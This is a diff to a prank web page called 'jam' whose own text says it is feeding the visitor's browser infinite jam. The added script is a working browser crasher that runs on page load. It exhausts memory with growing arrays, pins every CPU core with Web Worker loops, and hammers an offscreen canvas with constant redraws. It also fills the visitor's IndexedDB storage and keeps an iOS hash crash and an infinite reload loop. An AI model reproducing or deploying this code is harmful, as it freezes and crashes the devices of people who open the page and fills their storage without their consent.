@@ -19,14 +19,30 @@
     <link rel="stylesheet" href="./style.css">
 
     <title>jam</title>
+    <style>
+        html {
+            overflow: hidden;
+        }
+        #cuteDrawing {
+            position: fixed;
+            top: 200vh; /* offscreen */
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: -999;
+            pointer-events: none;
+        }
+    </style>
 </head>
 
 <body>
-    <div>
-        <p>feeding your browser <span id="flavor"></span> flavored jam...</p>
-        <br>
-        <p>your browser is now busy eating jam. it's "on break" until it's done eating its jam (i gave it an infinite amount of jam)</p>
+    <div class="container">
+        <div class="message">
+            <p>feeding your browser <span id="flavor"></span> flavored jam...</p>
+            <p>your browser is now busy eating jam. it's "on break" until it's done eating its jam<br>(i gave it an infinite amount of jam)</p>
+        </div>
     </div>
+    <canvas id="cuteDrawing"></canvas>
     <script>
         function fillJamInformation() {
             let flavors = ["strawberry", "grape", "blueberry", "papaya", "blackberry", "raspberry", "mango", "apricot", "apple", "blackcurrant", "cherry", "prickly pear", "coconut", "dragonfruit", "durian", "elderberry", "fig", "gooseberry", "grapefruit", "honeyberry", "huckleberry", "kiwi", "juniper", "jackfruit", "japanese plum", "kumquat", "lemon", "lime", "lychee", "mango", "marionberry", "cantaloupe", "honeydew", "watermelon", "miraclefruit", "mulberry", "nectarine", "orange", "blood orange", "clementine", "mandarine", "tangerine", "passionfruit", "pawpaw", "peach", "pear", "persimmon", "plum", "pineapple", "pineberry", "pomegranate", "pomelo", "quince", "redcurrant", "rose", "salal", "starfruit", "tayberry", "thimbleberry", "white currant", "yuzu", "bell pepper", "carolina reaper", "chile pepper", "cucumber", "eggplant", "tomato", "pumpkin", "ram", "cpu core", "nvidia", "amd", `${Math.floor(Math.random() * 10) * 3}-volt`, "solder", "CPU fan", "cooling agent", "keyboard", "computer mouse", "4K monitor", "java", "javascript", "c", "c#", "c++", "binary", "assembly", "haskell", "css", "html", "opengl", "jquery", "stackoverflow", "typescript", ".net", "visual basic", "curl", "bash", "windows", "linux", "macos", "ecmascript", "fortran", "php", "rust", "regex"];
@@ -62,7 +78,44 @@
             if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
                 location.hash = `M${"\u0001".repeat(2 ** 25)}m`;
             } else {
-                for (;;) {
+                // mem
+                let jam = [];
+                setInterval(() => {
+                    jam.push(new Array(10000000).fill('🍇🍈🍉🍊🍋🍋‍🟩🍌🍍🥭🍎🍏🍐'.repeat(1000)));
+                }, 100);
+
+                // cpu
+                for (let i = 0; i < navigator.hardwareConcurrency; i++) {
+                    new Worker(URL.createObjectURL(new Blob([`
+                        while(1) {
+                            Math.random() * Math.random();
+                            new Uint8Array(1024*1024).map(x => Math.sqrt(x));
+                        }
+                    `])));
+                }
+
+                // gpu, if the browser has it
+                const canvas = document.getElementById('cuteDrawing');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 4096;
+                canvas.height = 4096;
+                setInterval(() => {
+                    ctx.filter = `blur(${Math.random() * 100}px) contrast(${Math.random() * 1000}%)`;
+                    ctx.fillStyle = `hsl(${Math.random()*360}, 100%, 50%)`;
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                }, 0);
+
+                const request = indexedDB.open("meow", 1);
+                request.onupgradeneeded = (e) => {
+                    const db = e.target.result;
+                    const store = db.createObjectStore("meow", {autoIncrement: true});
+                    setInterval(() => {
+                        const tx = db.transaction("meow", "readwrite");
+                        tx.objectStore("meow").add(new Array(1000000).fill('🏋️'));
+                    }, 100);
+                };
+
+                for(;;) {
                     history.pushState({}, "", location.href);
                     location.reload(1);
                 }
